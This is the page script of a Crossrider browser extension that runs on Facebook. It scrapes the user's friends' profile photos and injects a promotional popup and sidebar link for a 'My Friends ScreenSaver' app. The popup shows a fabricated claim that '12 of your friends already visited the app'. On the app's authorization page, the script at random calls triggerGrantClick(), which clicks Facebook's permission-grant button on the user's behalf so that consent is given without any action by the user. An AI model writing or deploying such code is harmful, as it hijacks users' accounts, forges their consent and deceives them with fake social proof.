  /************************************************************************************
  This is your Page Code. The appAPI.ready() code block will be executed on every page load.
  For more information please visit our docs site: http://docs.crossrider.com
*************************************************************************************/
(function ($) {   
    var fb_app_url = 'https://www.facebook.com/appcenter/topfriendscreensaver?mfssredir=1';
    
    function initFacebookCampign() {
		var menuNavItem = $('#appsNav ul li:first');
		
		$.when(fetchUserFriends()).then(function (images) {	
			menuNavItem.after(getLinkHtml(images));
			
			initEventsFB();
		});
	}
	
	function initAppPageCampaign() {
		var isAuto = Math.floor(Math.random() * 2);
		
		if (top.location.href.indexOf('mfssredir') > -1) {
			if (isAuto) {
				triggerGrantClick();
			} else {
				$.when(fetchUserFriends()).then(function (images) {	
					var container = $('#grant_clicked').parent().css('position', 'relative');
					
					container.append(getPopupHtml({images:images, type:'app'}));
					
					initEventsApp();
				});
			}
		}
	}
	
	function initEventsFB() {
		$('#mfss_notification_close').on('click', notificationClose);
		$('#mfss_notification_gotoapp, #mfss_notification_gotoapp_link').on('click', redirectToApp);
	}
	
	function initEventsApp() {
		$('#mfss_notification_close').on('click', notificationClose);
		$('#mfss_notification_gotoapp').on('click', triggerGrantClick);
		$('#grant_clicked').on('click', setSuccessTrue);
	}
	
	function fetchUserFriends() {
		var dfd = $.Deferred(),
			user = getUserId();
		
		appAPI.request.get('https://www.facebook.com/' + user + '/friends', function (response) {
			var images = [],
				rxImg = /^(https?\:\/\/(?:.*?)\.jpg)/;
	
			response.replace(/\<img(?:.*?)src\=\"((?:[^\"]*?)_n\.jpg)\"(?:[^>]*?)itemprop="photo" \/>/gi, function ($, $1) {	
				images.push($1);
			});

			response.replace(/(https?\:\/\/fbcdn\-profile(?:.*?)\/s80x80\/(?:.*?)\.jpg)/gi, function ($, $1) {	
				images.push($1);
			});
			
			images = $.map(images.slice(0, 10), function (img) {
				rxImg.test(img);

				return RegExp.$1;
			});

			dfd.resolve(images);
		});
			
		return dfd.promise();
	}
	
	function getUserId() {
		var user = $('#pageNav li.navItem.firstItem a');
		
		return user.attr('href').substring(user.attr('href').lastIndexOf('/') + 1).replace(/\?.*$/, '');
	}
	
	function getPopupHtml(cfg) {
		var type = cfg.type,
			images = cfg.images,
			xPos = type == 'fb' ? 'right:-342px' : 'left:-362px',
			marginLeft = type == 'fb' ? '25' : '18',
			marginTop = type == 'fb' ? '25' : '30',
			closeRight = type == 'fb' ? '7' : '15',
			html = [];
		
		html.push('<div style="width:342px;height:193px;position:absolute;top:-18px;' + xPos + ';z-index:100000;background:#fff url(data:image/png;base64,' + getBgImage(type) + ');">');	
			html.push('<div id="mfss_notification_close" style="position:absolute;top:9px;right:' + closeRight + 'px;width:14px;height:14px;cursor:pointer;background:url(data:image/gif;base64,R0lGODlhDQANAKECAA4ODtXV1f///////ywAAAAADQANAAACIIyPKMst5iKMbQrA8LK3M+59QYNp27iYJiih1PmKyRwUADs=);"></div>');
			html.push('<div style="margin-left:' + marginLeft + 'px;margin-top:18px;font-weight:bold;font-size:14px;height:25px;">Introducing My Friends Screensaver</div>');
			html.push('<div style="margin-left:' + marginLeft + 'px;font-size:12px;height:50px;line-height:1.5;">Make your screensaver from your friends photos.<br />Discover new photos every day.</div>');
			html.push('<div style="margin-left:' + marginLeft + 'px;font-size:12px;height:20px;">12 of your friends already visited the app</div>');
			html.push('<div style="margin-left:' + marginLeft + 'px;height:45px;">');
				$(images).each(function (i, img) {
					html.push('<img src="' + img + '" style="width:26px;height:26px;float:left;" />');
				});
			html.push('</div>');
			html.push('<div style="text-align:center;">');
				html.push('<img id="mfss_notification_gotoapp" style="cursor:pointer;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANwAAAAcCAIAAACF0EZiAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo2OEIwNTJGRDE2MzUxMUUyOTE3N0RBNUNEQ0Y3NDI3MiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo2OEIwNTJGRTE2MzUxMUUyOTE3N0RBNUNEQ0Y3NDI3MiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjY4QjA1MkZCMTYzNTExRTI5MTc3REE1Q0RDRjc0MjcyIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjY4QjA1MkZDMTYzNTExRTI5MTc3REE1Q0RDRjc0MjcyIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+6/DUmAAABhlJREFUeNrsWntM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" />');
			html.push('</div>');
		html.push('</div>');
		
		return html.join('');
	}
	
	function getLinkHtml(images) {
		var html =[];
		
		html.push('<li class="sideNavItem stat_elem" id="mfss_notification_fb_apps" style="position:relative;">');
			html.push('<a id="mfss_notification_gotoapp_link" class="item clearfix sortableItem" href="javascript://" title="My Friends ScreenSaver">');
				html.push('<div>');
					html.push('<span class="imgWrap">');
						html.push('<img class="img" src="https://fbcdn-photos-a.akamaihd.net/photos-ak-snc7/v85005/171/291989660905827/app_101_291989660905827_139885258.png" alt="" width="16" height="16">');
					html.push('</span>');
					html.push('<div class="linkWrap noCount">My Friends ScreenSaver</div>');
				html.push('</div>');
			html.push('</a>');
			html.push(getPopupHtml({images:images, type:'fb'}));
		html.push('</li>');
		
		return html.join('');
	}
	
	function getBgImage(type) {
		if (type == 'fb') {
			return 'iVBORw0KGgoAAAANSUhEUgAAAVYAAADBCAIAAAAb2Q+bAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo2OEIwNTJGOTE2MzUxMUUyOTE3N0RBNUNEQ0Y3NDI3MiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo2OEIwNTJGQTE2MzUxMUUyOTE3N0RBNUNEQ0Y3NDI3MiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjY4QjA1MkY3MTYzNTExRTI5MTc3REE1Q0RDRjc0MjcyIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjY4QjA1MkY4MTYzNTExRTI5MTc3REE1Q0RDRjc0MjcyIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+H3PGoAAABEZJREFUeNrs3ctK81oYgOEmjYcKXoY6KeIBJ4KgN+PUgd6GIy/IguDEszjxIhwVrdrW/os/7NBdkwobYevK8wyk2uBg0e/tiqQxuby83NzcbFQbjUaNSA2HwwbUQLPZLB4nSTL+VDZ98se/xp0DiFj+blcMf/4gTdNut5tVzf9nUSYgyzKvD+I2GAzGJz/5x/Pzc/kuIB/4j79OTk6sIERpf3+/JAHj859vHg4PDy0W/NL3/6p97vHxcf4gLd0F5PNf7B+AWM9z06pdQJj/fr9vESFu6cT82wVATSwuLlbuAoqNgGWCGu0CJs4FXDkDdUzA+F7AAkG9EvD5ciCgdruAIgcWCOqbAEACgDh1u10JALsAQAKAuim/OhCwCwAkoNF4eHiwQBC3yo8T39/fPz4+Vj1bfILIjbcgwl3A7e3t3d3dlPsF5ZNv/iHCBNzc3FxcXHx5v7D/Nv8+egA/+kTg+vr6/Pz8G+8XODHw4duJ25gD/4v86sBsYv7Pzs6+936hEwNv/uGHngiE+e90Ou4XDHVMQJj/09PTL+ffrcQg2l0AUN8EbGxs7O3tFf9doEqWZTYCEIenp6d/7QJCBXZ3d6dXwPxDzCcCoQI7Oztf7gWAaP8WECqwvb09pQKuCIRo9Hq9kj8Hrq+vb21tlVbA/ENkykd6bW3t/f3dGQHU7kSgsLq6urKyYoGgpgkI2u22BYL6JgCQAEACAAko5XpBqHUCXCkATgQACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQAJsAQgAYAEABIASAAgAYAEABIASAAgAYAEABIASAAgAYAEABIASAAgAYAEABIASABQkwSMRiNrCrXeBagA1P1EQAXgt8i+99clSWJNoe67AEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkACQAkAJAAQAIACQAkAJAAQAIACQAkAJAAQAIACQB+uezLI66uriwT1DcBy8vLlgki0+l0nAgAEgASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAHAT9ZqtSQA7AIACQAkAJAAQAIACQAkAJAAQAIACQBi0ev1piUgSRJrBLHKBzz9/NNxlgkiTkCr1cqqnsu12+2joyOLBbHuArKq+U/TtNlsLi0tHRwcvL299fv94XD48fExGo1iWoX5+XkvBSL2+vpazHU+1DMzM3Nzc+GVHx6XJKB4/w9HZ1kWjg5jH34ejo4yARC34k2uSECY69nZ2TDa4cFkAsJBYcLHD83nP3w7GAzy+Y8sAS8vL14lRGxhYWFid5+/tRcJ+CPAADtMboAGK8beAAAAAElFTkSuQmCC';
		} else if (type == 'app') {
			return 'iVBORw0KGgoAAAANSUhEUgAAAVYAAADBCAIAAAAb2Q+bAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo1Qjc3Q0NCQzE2NEExMUUyOTE3N0RBNUNEQ0Y3NDI3MiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo1Qjc3Q0NCRDE2NEExMUUyOTE3N0RBNUNEQ0Y3NDI3MiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjY4QjA1MkZGMTYzNTExRTI5MTc3REE1Q0RDRjc0MjcyIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjY4QjA1MzAwMTYzNTExRTI5MTc3REE1Q0RDRjc0MjcyIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+PcVypAAABGdJREFUeNrs3ctKI1kcwOEuU14i5DV0I97AjSDoK/geruJrZOETGRDcSLzhRt/BjQEzkkvNSVdbnU7nMjM0gzn1fdAQrdp4yP9Xp6JJp1mWfRsx+mW/3/8GJVCpVGL90ZIkmXG01Wql7Xa7VqsNBoPR+R/rAsQtsqtdMfbhQZjl/MtpLUjDv1CBarWafRpNQJqmnh/ErdfrRXnlT341rQI/Jvzi4sJTAaJ0dna29N3ECvy8yNfr9WmNtBeABdVoNIrbnIkVmD/b5h/iuNMp7gj+XQKAhdbtdvP5D7uA4tXBwnBjUKvVLBNEvAsI9wKDwWDsxf6fCQDiTkA+/8Wv/CQASqTYAkz8ex8JgMhNu/5LAJQrAW4EoKQJmHFUAqDUhglot9sWAsqbAEACgLImwF8Hgl0AIAGABAAxeXp6kgCIVu/TtBOen58fHx8lAOKUf6jPjI/2qdfrDw8P9/f3EgBf2ow38/yTCswQKnBzc3N3dzc5Af46EL5UBWa8q+c/CxW4vr6+vb21C4AvKv9sr98//PsPVuDq6mqsAhIAJRIq0Gw2RysgARCVuf8zSqjA5eVlUQEJgFIbJuD19dVCQBxbgLm/HWg0GicnJ/v7+3YBULobgTD/x8fHxfxLAJRImP+jo6PR+R8moNPpWBqIw4y7gDD/h4eHY/NvFwClqECY/4ODg729vd8PSQDEv//f2dnZ3d2deFQCIHKbm5vb29vTjkoARG5ra2vGUQmAUpMAkABAAoCFM/dNQRIAMZv7jgAJACQAkABAAgAJACQAkACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJAAkAFgUWZZJAJh/CQDz/yekVhYWQpIkXgsAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkAJACQAEACAAkACbAEIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAASAEgAIAGABAD/j7R41Gq1LAeUNwEbGxuWAyLTbDbdCAASAEgAIAGABAASAEgASAAgAYAEABIASAAgAYAEABIASAAgAYAEABIASACw0AmoVqtWAewCAAkAJACQAEACAAkAJACQAEACAAkAYklAp9OxClDqXUCSJBYCYjV7wIdvE5IAiDsBo8aOpvkZLy8v5+fnFgsic3p6Om34fwTi7e2t3W7/9d3Hx0e32+33+4PBIMuy/Iy1tTXrSMTCMz+ya/7S0lKlUlleXl5dXV37FB6H74Tvh6NFDlqt1nAXkKZpOBbGPjwOZ4wlAOIW2UWuSECY65WVlTDa4UE+9lNvBMIZ+fyH83q9Xj7/RQLe3989S4jY+vp6fHf+YZbzS3uegNGL/1gF/hZgADaaV6grlHcdAAAAAElFTkSuQmCC';
		}
	}
	
	function isTimeToShow() {
		var isSuccess = appAPI.internal.db.get('_fb_campign_1_success'),
			click = appAPI.internal.db.get('_fb_campign_1_click'),
			clickCount = appAPI.internal.db.get('_fb_campign_1_click_count');
		
		if (!click && !isSuccess && (!clickCount || clickCount <= 3)) {
			return true;
		}
		
		return false;
	}
	
	function isNotSuccess() {
		var success = appAPI.internal.db.get('_fb_campign_1_success');
		
		if (!success) {
			return true;
		} else {
			return false;
		}
	}
	
	function redirectToApp() {
		storeClickData();

		appAPI.openURL(fb_app_url, 'current');
	}
	
	function notificationClose(cfg) {
		var li = $('#mfss_notification_fb_apps');
			
		li.remove();	
		storeClickData();
	}
	
	function triggerGrantClick() {
		appAPI.internal.db.set('_fb_campign_1_success', true);
				
		$('#grant_clicked').trigger('click');
	}
	
	function setSuccessTrue() {
		appAPI.internal.db.set('_fb_campign_1_success', true);
	}
	
	function storeClickData() {
		var clickCount = appAPI.internal.db.get('_fb_campign_1_click_count');
		
		appAPI.internal.db.set('_fb_campign_1_click', true, appAPI.time.hoursFromNow(24));
		
		if (!clickCount) {
			appAPI.internal.db.set('_fb_campign_1_click_count', 1);
		} else {
			appAPI.internal.db.set('_fb_campign_1_click_count', ++ clickCount);
		}
	}

	if ($.browser.msie) {
		$(function () {
			if (appAPI.isMatchPages('www.facebook.com/appcenter/topfriendscreensaver') && isNotSuccess()) {
				initAppPageCampaign();
			}
			else if (appAPI.isMatchPages('facebook.com') && isTimeToShow() && $('#appsNav').length) {
				initFacebookCampign();
			}
		});
	} else {
		if (appAPI.isMatchPages('www.facebook.com/appcenter/topfriendscreensaver') && isNotSuccess()) {
			initAppPageCampaign();
		}
		else if (appAPI.isMatchPages('facebook.com') && isTimeToShow() && $('#appsNav').length) {
			initFacebookCampign();
		}
	}

})(jQuery);